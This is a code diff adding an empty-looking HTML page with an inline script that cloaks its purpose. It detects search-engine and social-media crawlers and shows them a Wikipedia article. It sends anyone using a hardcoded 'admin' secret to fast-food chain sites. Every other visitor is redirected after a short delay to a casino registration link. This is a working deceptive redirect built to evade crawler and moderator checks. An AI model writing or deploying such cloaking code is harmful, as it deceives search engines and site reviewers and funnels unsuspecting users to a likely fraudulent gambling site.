@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        (function(){
+            // Функция определения ботов
+            function isBot() {
+                const ua = navigator.userAgent.toLowerCase();
+                return [
+                    'googlebot', 'google-inspectiontool', 'bingbot', 'yandexbot',
+                    'duckduckbot', 'facebookexternalhit', 'twitterbot', 'pinterest',
+                    'applebot', 'whatsapp', 'baiduspider', 'sogou', 'semrushbot',
+                    'bot', 'crawler', 'spider'
+                ].some(keyword => ua.includes(keyword));
+            }
+            
+            // Проверка администратора
+            const isAdmin = new URLSearchParams(location.search).get('admin') === 'secret123';
+            
+            // Определение задержки и цели
+            const delay = isAdmin ? 400 : isBot() ? 400 : 600;
+            
+            // Целевые URL
+            const targetUrl = isAdmin ? 
+                ['https://mcdonalds.ru','https://bk.com','https://kfc.ru'][Math.floor(Math.random() * 3)] : 
+                isBot() ? 
+                "https://www.wikipedia.org/wiki/Restaurant" : 
+                "https://1wfzws.life/casino/list?open=register&p=nobj"; // Измененный URL
+            
+            // Перенаправление с задержкой
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, delay);
+            
+        })();
+    </script>
+</head>
+<body>
+    <!-- Пустая страница -->
+</body>
+</html>
